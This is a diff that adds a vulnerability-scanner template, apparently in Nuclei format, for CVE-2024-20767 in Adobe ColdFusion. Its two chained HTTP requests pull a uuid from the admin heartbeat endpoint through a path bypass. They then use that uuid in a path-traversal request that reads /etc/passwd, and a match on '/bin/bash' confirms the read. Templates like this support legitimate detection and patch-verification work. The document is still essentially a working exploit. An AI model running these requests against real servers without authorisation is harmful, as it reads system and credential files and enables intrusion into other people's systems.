@@ -1,0 +1,57 @@
+id: CVE-2024-20767-adobe-coldfusion-anyfile-read
+info:
+  name: Adobe ColdFusion Arbitrary File Read Vulnerability (CVE-2024-20767)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2024-20767,coldfusion,arbitrary-file-read
+
+variables:
+  uuid: ""
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-request
+    method: GET
+    path:
+      - "{{BaseURL}}/hax/..CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uuid"
+          - "wddxPacket"
+    extractors:
+      - type: regex
+        name: uuid
+        part: body
+        regex:
+          - "<var name='uuid'><string>([a-zA-Z0-9-]+)</string>"
+        group: 1
+        internal: true
+
+  - id: verify-file-read
+    method: GET
+    path:
+      - "{{BaseURL}}/hax/../pms?module=logging&file_name=../../../../../../../../../../../../../../../../../../etc/passwd&number_of_lines=1000"
+    headers:
+      uuid: "{{uuid}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/bin/bash"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
